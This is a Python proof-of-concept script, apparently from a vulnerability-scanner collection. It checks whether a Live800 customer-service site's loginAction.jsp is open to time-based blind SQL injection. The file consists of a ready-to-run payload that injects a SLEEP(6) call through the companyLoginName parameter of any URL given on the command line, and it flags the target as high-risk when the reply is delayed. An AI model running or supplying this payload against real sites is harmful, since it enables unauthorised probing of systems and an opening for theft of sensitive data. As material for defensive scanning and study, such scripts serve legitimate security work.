#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: live800在线客服系统loginAction SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0147511
author: Lucifer
description: 文件/live800/loginAction.jsp中,参数companyLoginName存在时间盲注,导致敏感信息泄露。
'''
import sys
import time
import requests
import warnings
from termcolor import cprint

class live800_loginAction_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/live800/loginAction.jsp?companyLoginName=1%27Or(SeLeCt%20SlEeP(6))%23&loginName=a&password=a"
        vulnurl = self.url + payload
        start_time = time.time()
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if time.time() - start_time >= 6:
                cprint("[+]存在live800在线客服系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = live800_loginAction_sqli_BaseVerify(sys.argv[1])
    testVuln.run()